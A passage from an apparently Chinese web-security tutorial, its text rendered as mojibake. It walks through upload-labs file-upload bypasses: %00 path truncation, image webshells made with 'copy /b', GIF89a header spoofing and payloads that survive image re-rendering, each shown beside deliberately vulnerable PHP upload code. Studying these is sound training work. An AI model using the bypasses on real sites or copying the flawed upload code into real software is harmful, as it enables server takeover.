class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-14-ç›®å½•å¯æ§-POST-ç»•è¿‡ä¸Šä¼ "><a href="#2-5-14-ç›®å½•å¯æ§-POST-ç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.14 ç›®å½•å¯æ§ POST ç»•è¿‡ä¸Šä¼ "></a>2.5.14 ç›®å½•å¯æ§ POST ç»•è¿‡ä¸Šä¼ </h2><h3 id="ç›®å½•å¯æ§-POST-ç»•è¿‡ä¸Šä¼ æ–¹æ³•"><a href="#ç›®å½•å¯æ§-POST-ç»•è¿‡ä¸Šä¼ æ–¹æ³•" class="headerlink" title="ç›®å½•å¯æ§ POST ç»•è¿‡ä¸Šä¼ æ–¹æ³•"></a>ç›®å½•å¯æ§ POST ç»•è¿‡ä¸Šä¼ æ–¹æ³•</h3><p>æ–‡ä»¶åå¯æ§ï¼Œé€šè¿‡æŠ“åŒ…ä¿®æ”¹å¯æ§çš„å‚æ•°ï¼Œä¸ä¸åŒçš„ä¸­é—´ä»¶çš„ç¼ºé™·é…åˆä½¿ç”¨ã€‚</p><ul><li>ä½¿ç”¨%00 æˆªæ–­æ–‡ä»¶å å† post ç¯å¢ƒä¸‹%00 è¦ç»è¿‡ decode ä½†æ˜¯å— gpc é™åˆ¶</li></ul><p>ä½¿ç”¨ burpsutie POST %00 æˆªæ–­æ–‡ä»¶å</p><p>å¦‚æœç›®å½•å½“å‰ç›®å½•ä¸èƒ½è§£æè„šæœ¬ï¼Œå¯ä»¥ç§»åŠ¨åˆ°å…¶ä»–ç›®å½•å†è¿›è¡Œæˆªæ–­æäº¤ã€‚</p><h3 id="ç›®å½•å¯æ§-POST-ç»•è¿‡ä¸Šä¼ åŸç†"><a href="#ç›®å½•å¯æ§-POST-ç»•è¿‡ä¸Šä¼ åŸç†" class="headerlink" title="ç›®å½•å¯æ§ POST ç»•è¿‡ä¸Šä¼ åŸç†"></a>ç›®å½•å¯æ§ POST ç»•è¿‡ä¸Šä¼ åŸç†</h3><p>ä¸ŠèŠ‚æ˜¯ GET è¯·æ±‚çš„ï¼Œå¯ä»¥ç›´æ¥åœ¨ url è¾“å…¥%00 å³å¯æˆªæ–­ï¼Œä½†æ˜¯åœ¨ post ä¸‹ç›´æ¥æ³¨å…¥%00 æ˜¯ä¸è¡Œçš„ï¼Œéœ€è¦æŠŠ%00è§£ç å˜æˆç©ºç™½ç¬¦ï¼Œæˆªæ–­æ‰æœ‰æ•ˆã€‚æ‰èƒ½æŠŠç›®å½•æˆªæ–­æˆæ–‡ä»¶å</p><h3 id="ç›®å½•å¯æ§-POST-ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"><a href="#ç›®å½•å¯æ§-POST-ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ" class="headerlink" title="ç›®å½•å¯æ§ POST ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"></a>ç›®å½•å¯æ§ POST ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ext_arr</span> = <span class="keyword">array</span>(<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;png&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>);</span><br><span class="line">    <span class="variable">$file_ext</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="title function_ invoke__">strrpos</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],<span class="string">&quot;.&quot;</span>)+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>,<span class="variable">$ext_arr</span>))&#123;</span><br><span class="line">        <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">        <span class="variable">$img_path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;save_path&#x27;</span>].<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_ext</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å¤±è´¥&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-15-æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ "><a href="#2-5-15-æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.15 æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ "></a>2.5.15 æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ </h2><h3 id="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ æ–¹æ³•"><a href="#æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ æ–¹æ³•" class="headerlink" title="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ æ–¹æ³•"></a>æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ æ–¹æ³•</h3><p>1.åˆ¶ä½œå›¾ç‰‡ä¸€å¥è¯ï¼Œä½¿ç”¨ copy 1.gif&#x2F;b+moon.php shell.php å°† php æ–‡ä»¶é™„åŠ å† jpg å›¾ç‰‡ä¸Šï¼Œç›´æ¥ä¸Šä¼ å³å¯</p><p>ï¼ˆæœ¬ä¾‹å­å› ä¸ºé™åˆ¶äº†åç¼€ä¸º jpgï¼Œå¯ä»¥è€ƒè™‘æ–‡ä»¶åŒ…å«å°†å›¾ç‰‡æ–‡ä»¶åŒ…å«è¿›å» getshell</p><p>burpsuite ä¸Šä¼ çš„æ•°æ®åŒ…å¤´åŠ ä¸Š GIF89aï¼‰</p><h3 id="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ åŸç†"><a href="#æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ åŸç†" class="headerlink" title="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ åŸç†"></a>æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ åŸç†</h3><p>æœ‰çš„æ–‡ä»¶ä¸Šä¼ ï¼Œä¸Šä¼ æ—¶å€™ä¼šæ£€æµ‹å¤´æ–‡ä»¶ï¼Œä¸åŒçš„æ–‡ä»¶ï¼Œå¤´æ–‡ä»¶ä¹Ÿä¸å°½ç›¸åŒã€‚å¸¸è§çš„æ–‡ä»¶ä¸Šä¼ å›¾ç‰‡å¤´æ£€æµ‹ å®ƒæ£€æµ‹å›¾ç‰‡æ˜¯ä¸¤ä¸ªå­—èŠ‚çš„é•¿åº¦ï¼Œå¦‚æœä¸æ˜¯å›¾ç‰‡çš„æ ¼å¼ï¼Œä¼šç¦æ­¢ä¸Šä¼ ã€‚<br>å¸¸è§çš„æ–‡ä»¶å¤´</p><ul><li>JPEG (jpg)ï¼Œæ–‡ä»¶å¤´ï¼šFFD8FF</li><li>PNG (png)ï¼Œæ–‡ä»¶å¤´ï¼š89504E47</li><li>GIF (gif)ï¼Œæ–‡ä»¶å¤´ï¼š47494638</li><li>TIFF (tif)ï¼Œæ–‡ä»¶å¤´ï¼š49492A00</li><li>Windows Bitmap (bmp)ï¼Œæ–‡ä»¶å¤´ï¼š424D</li></ul><h3 id="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"><a href="#æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ" class="headerlink" title="æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"></a>æ–‡ä»¶å¤´æ£€æµ‹ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ</h3><p>è¿™ä¸ªæ˜¯å­˜åœ¨æ–‡ä»¶å¤´æ£€æµ‹çš„ä¸Šä¼ ï¼ŒgetReailFileType æ˜¯æ£€æµ‹ jpgã€pngã€gif çš„æ–‡ä»¶å¤´<br>å¦‚æœä¸Šä¼ çš„æ–‡ä»¶ç¬¦åˆæ•°å­—å³å¯é€šè¿‡æ£€æµ‹ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getReailFileType</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$filename</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$bin</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$file</span>, <span class="number">2</span>); <span class="comment">//åªè¯»2å­—èŠ‚</span></span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$strInfo</span> = @<span class="title function_ invoke__">unpack</span>(<span class="string">&quot;C2chars&quot;</span>, <span class="variable">$bin</span>);    </span><br><span class="line">    <span class="variable">$typeCode</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$strInfo</span>[<span class="string">&#x27;chars1&#x27;</span>].<span class="variable">$strInfo</span>[<span class="string">&#x27;chars2&#x27;</span>]);    </span><br><span class="line">    <span class="variable">$fileType</span> = <span class="string">&#x27;&#x27;</span>;    </span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$typeCode</span>)&#123;      </span><br><span class="line">        <span class="keyword">case</span> <span class="number">255216</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;jpg&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">13780</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;png&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;        </span><br><span class="line">        <span class="keyword">case</span> <span class="number">7173</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;gif&#x27;</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:            </span><br><span class="line">            <span class="variable">$fileType</span> = <span class="string">&#x27;unknown&#x27;</span>;</span><br><span class="line">        &#125;    </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$fileType</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$file_type</span> = <span class="title function_ invoke__">getReailFileType</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$file_type</span> == <span class="string">&#x27;unknown&#x27;</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$file_type</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-16-å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ "><a href="#2-5-16-å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ " class="headerlink" title="2.5.16 å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ "></a>2.5.16 å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ </h2><h3 id="å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ æ–¹æ³•"><a href="#å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ æ–¹æ³•" class="headerlink" title="å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ æ–¹æ³•"></a>å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ æ–¹æ³•</h3><p>ç”¨æ–‡ä»¶åŒ…å«æ¼æ´å¼•å…¥ jpeg å›¾ç‰‡å³å¯ getshell</p><h3 id="å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ åŸç†"><a href="#å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ åŸç†" class="headerlink" title="å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ åŸç†"></a>å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ åŸç†</h3><h3 id="å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"><a href="#å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ" class="headerlink" title="å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ"></a>å›¾ç‰‡æ£€æµ‹å‡½æ•°ç»•è¿‡ä¸Šä¼ ä»£ç åˆ†æ</h3><p>pass-15<br>getimagesize æ˜¯è·å–å›¾ç‰‡çš„å¤§å°ï¼Œå¦‚æœå¤´æ–‡ä»¶ä¸æ˜¯å›¾ç‰‡ä¼šæŠ¥é”™ç›´æ¥å¯ä»¥ç”¨å›¾ç‰‡é©¬ç»•è¿‡æ£€æµ‹ã€‚</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isImage</span>(<span class="params"><span class="variable">$filename</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$types</span> = <span class="string">&#x27;.jpeg|.png|.gif&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="variable">$info</span> = <span class="title function_ invoke__">getimagesize</span>(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="variable">$ext</span> = <span class="title function_ invoke__">image_type_to_extension</span>(<span class="variable">$info</span>[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$types</span>,<span class="variable">$ext</span>)&gt;=<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$ext</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line">    <span class="variable">$res</span> = <span class="title function_ invoke__">isImage</span>(<span class="variable">$temp_file</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$res</span>)&#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="string">&quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">&quot;/&quot;</span>.<span class="title function_ invoke__">rand</span>(<span class="number">10</span>, <span class="number">99</span>).<span class="title function_ invoke__">date</span>(<span class="string">&quot;YmdHis&quot;</span>).<span class="variable">$res</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>,<span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&quot;ä¸Šä¼ å‡ºé”™ï¼&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-5-17-ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ "><a href="#2-5-17-ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ " class="headerlink" title="2.5.17 ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ "></a>2.5.17 ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ </h2><h3 id="ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ æ–¹æ³•"><a href="#ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ æ–¹æ³•" class="headerlink" title="ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ æ–¹æ³•"></a>ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ æ–¹æ³•</h3><p>é¦–å…ˆåˆ¤æ–­å›¾ç‰‡æ˜¯å¦å…è®¸ä¸Šä¼  gifï¼Œgif å›¾ç‰‡åœ¨äºŒæ¬¡æ¸²æŸ“åï¼Œä¸åŸå›¾ç‰‡å·®åˆ«ä¸ä¼šå¤ªå¤§ã€‚æ‰€ä»¥äºŒæ¬¡æ¸²æŸ“æ”»å‡»æœ€å¥½ç”¨ gif å›¾ç‰‡é©¬ã€‚</p><p>åˆ¶ä½œå›¾ç‰‡é©¬</p><p>å°†åŸå›¾ç‰‡ä¸Šä¼ ï¼Œä¸‹è½½æ¸²æŸ“åçš„å›¾ç‰‡è¿›è¡Œå¯¹æ¯”ï¼Œæ‰¾ç›¸åŒå¤„ï¼Œè¦†ç›–å­—ç¬¦ä¸²ï¼Œå¡«å†™ä¸€å¥è¯åé—¨ï¼Œæˆ–è€…æ¶æ„æŒ‡ä»¤ã€‚</p><p>åŸå›¾ç‰‡ä¸æ¸²æŸ“åçš„å›¾ç‰‡è¿™ä¸ªä½ç½®çš„å­—ç¬¦ä¸²æ²¡æœ‰æ”¹å˜æ‰€åœ¨åŸå›¾ç‰‡è¿™é‡Œæ›¿æ¢æˆä¸€å¥è¯æœ¨é©¬<? php phpinfo();?>ç›´æ¥ä¸Šä¼ å³å¯</p><p>å†ç”¨æ–‡ä»¶åŒ…å«æ¼æ´ä¼ å‚fileä¸ºå›¾ç‰‡è·¯å¾„å³å¯ getshell</p><p>ä¸€èˆ¬ä¸ä¼šå¯¹æ¸²æŸ“ä¹‹åçš„å†æ¬¡æ¸²æŸ“</p><h3 id="ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ åŸç†"><a href="#ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ åŸç†" class="headerlink" title="ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ åŸç†"></a>ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ åŸç†</h3><p>æœ‰äº›å›¾ç‰‡ä¸Šä¼ ï¼Œä¼šå¯¹ä¸Šä¼ çš„å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡æ¸²æŸ“ååœ¨ä¿å­˜ï¼Œä½“ç§¯å¯èƒ½ä¼šæ›´å°ï¼Œå›¾ç‰‡ä¼šæ¨¡ç³Šä¸€äº›ï¼Œä½†æ˜¯ç¬¦åˆç½‘ç«™çš„éœ€æ±‚ã€‚ä¾‹å¦‚æ–°é—»å›¾ç‰‡å°é¢ç­‰å¯èƒ½éœ€è¦äºŒæ¬¡æ¸²æŸ“ï¼Œå› ä¸ºåŸå›¾ç‰‡å ç”¨çš„ä½“ç§¯æ›´å¤§ã€‚è®¿é—®çš„äººæ•°å¤ªå¤šæ—¶å€™ä¼šå ç”¨ï¼Œå¾ˆå¤§å¸¦å®½ã€‚äºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡å†…å®¹ä¼šå‡å°‘ï¼Œå¦‚æœé‡Œé¢åŒ…å«åé—¨ä»£ç ï¼Œå¯èƒ½ä¼šè¢«çœç•¥ã€‚å¯¼è‡´ä¸Šä¼ çš„å›¾ç‰‡é©¬ï¼Œæ¶æ„ä»£ç è¢«æ¸…é™¤ã€‚</p><h3 id="ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ ä»£ç åˆ†æ"><a href="#ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ ä»£ç åˆ†æ" class="headerlink" title="ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ ä»£ç åˆ†æ"></a>ç»•è¿‡å›¾ç‰‡äºŒæ¬¡æ¸²æŸ“ä¸Šä¼ ä»£ç åˆ†æ</h3><p>åªå…è®¸ä¸Šä¼  JPG PNG gif åœ¨æºç ä¸­ä½¿ç”¨ imagecreatefromgif å‡½æ•°å¯¹å›¾ç‰‡è¿›è¡ŒäºŒæ¬¡ç”Ÿæˆã€‚ç”Ÿæˆçš„å›¾ç‰‡ä¿å­˜åœ¨ï¼Œupload ç›®å½•ä¸‹</p><p>$is_upload &#x3D; false;<br>$msg &#x3D; null;<br>if (isset($_POST[â€˜submitâ€™])){<br>    &#x2F;&#x2F; è·å¾—ä¸Šä¼ æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼Œæ–‡ä»¶åï¼Œç±»å‹ï¼Œå¤§å°ï¼Œä¸´æ—¶æ–‡ä»¶è·¯å¾„<br>    $filename &#x3D; $_FILES[â€˜upload_fileâ€™][â€˜nameâ€™];<br>    $filetype &#x3D; $_FILES[â€˜upload_fileâ€™][â€˜typeâ€™];<br>    $tmpname &#x3D; $_FILES[â€˜upload_fileâ€™][â€˜tmp_nameâ€™];</p><pre><code>$target_path=UPLOAD_PATH.&#39;/&#39;.basename($filename);// è·å¾—ä¸Šä¼ æ–‡ä»¶çš„æ‰©å±•å$fileext= substr(strrchr($filename,&quot;.&quot;),1);//åˆ¤æ–­æ–‡ä»¶åç¼€ä¸ç±»å‹ï¼Œåˆæ³•æ‰è¿›è¡Œä¸Šä¼ æ“ä½œif(($fileext == &quot;jpg&quot;) &amp;&amp; ($filetype==&quot;image/jpeg&quot;))&#123;    if(move_uploaded_file($tmpname,$target_path))&#123;        //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡        $im = imagecreatefromjpeg($target_path);        if($im == false)&#123;            $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯jpgæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;            @unlink($target_path);        &#125;else&#123;            //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å            srand(time());            $newfilename = strval(rand()).&quot;.jpg&quot;;            //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰            $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;            imagejpeg($im,$img_path);            @unlink($target_path);            $is_upload = true;        &#125;    &#125; else &#123;        $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;    &#125;&#125;else if(($fileext == &quot;png&quot;) &amp;&amp; ($filetype==&quot;image/png&quot;))&#123;    if(move_uploaded_file($tmpname,$target_path))&#123;        //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡        $im = imagecreatefrompng($target_path);        if($im == false)&#123;            $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯pngæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;            @unlink($target_path);        &#125;else&#123;             //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å            srand(time());            $newfilename = strval(rand()).&quot;.png&quot;;            //æ˜¾ç¤ºäºŒæ¬¡æ¸²æŸ“åçš„å›¾ç‰‡ï¼ˆä½¿ç”¨ç”¨æˆ·ä¸Šä¼ å›¾ç‰‡ç”Ÿæˆçš„æ–°å›¾ç‰‡ï¼‰            $img_path = UPLOAD_PATH.&#39;/&#39;.$newfilename;            imagepng($im,$img_path);            @unlink($target_path);            $is_upload = true;                       &#125;    &#125; else &#123;        $msg = &quot;ä¸Šä¼ å‡ºé”™ï¼&quot;;    &#125;&#125;else if(($fileext == &quot;gif&quot;) &amp;&amp; ($filetype==&quot;image/gif&quot;))&#123;    if(move_uploaded_file($tmpname,$target_path))&#123;        //ä½¿ç”¨ä¸Šä¼ çš„å›¾ç‰‡ç”Ÿæˆæ–°çš„å›¾ç‰‡        $im = imagecreatefromgif($target_path);        if($im == false)&#123;            $msg = &quot;è¯¥æ–‡ä»¶ä¸æ˜¯gifæ ¼å¼çš„å›¾ç‰‡ï¼&quot;;            @unlink($target_path);        &#125;else&#123;            //ç»™æ–°å›¾ç‰‡æŒ‡å®šæ–‡ä»¶å            srand(time());            $newfilename = strval(rand()).&quot;.gif&quot;;            